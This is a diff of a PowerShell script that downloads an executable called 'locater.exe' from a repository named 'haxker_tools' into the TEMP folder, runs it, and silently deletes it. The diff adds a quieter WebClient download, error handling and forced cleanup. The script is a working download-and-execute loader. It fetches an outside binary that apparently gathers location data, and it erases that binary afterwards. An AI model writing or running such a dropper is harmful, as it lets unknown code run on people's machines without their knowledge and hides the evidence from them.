@@ -1,11 +1,27 @@
 $OutputEncoding = [System.Text.Encoding]::UTF8
+$ProgressPreference = "SilentlyContinue"
 
 # Download exe
 $exeUrl = "https://github.com/brndan918/haxker_tools/raw/refs/heads/main/get_LonLat/GetFile/locater.exe"
 $exePath = "$env:TEMP\locater.exe"
-Write-Host "Downloading..."
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
 
+Write-Host "Downloading..."
+
+try {
+    # 🚀 Faster than Invoke-WebRequest
+    $wc = New-Object System.Net.WebClient
+    $wc.DownloadFile($exeUrl, $exePath)
+}
+catch {
+    Write-Host "Download failed:" $_.Exception.Message
+    exit 1
+}
+finally {
+    if ($wc) { $wc.Dispose() }
+}
+
+# Execute
 Start-Process $exePath -Wait
 
-Remove-Item $exePath
+# Cleanup
+Remove-Item $exePath -Force -ErrorAction SilentlyContinue
